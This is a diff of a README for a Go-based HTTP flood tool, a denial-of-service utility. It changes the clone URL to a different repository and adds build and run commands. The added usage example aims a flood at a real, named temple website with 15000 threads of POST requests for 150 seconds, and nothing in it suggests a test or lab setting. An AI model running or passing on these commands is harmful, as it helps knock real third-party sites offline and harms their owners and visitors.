@@ -33,7 +33,7 @@ Using Golang(net/socket) to httpflood
 
 Then:
 
-    git clone https://github.com/Leeon123/golang-httpflood.git
+    git clone https://github.com/Babumia420/HTTPFLOOD
 
 Header.txt format:
 
@@ -44,6 +44,10 @@ Header.txt format:
 Or anything else of http header. If you don't have any idea of this please just use "nil" for using default random header.
 ## Usage
 
-    cd golang-httpflood
+    cd HTTPFLOOD
     go build httpflood.go
     ./httpflood  <url> <threads> <get/post> <seconds> <header.txt/nil>
+    EXAMPLE:
+    ./httpflood https://www.iskcondelhi.com 15000 post 150 nit
+
+
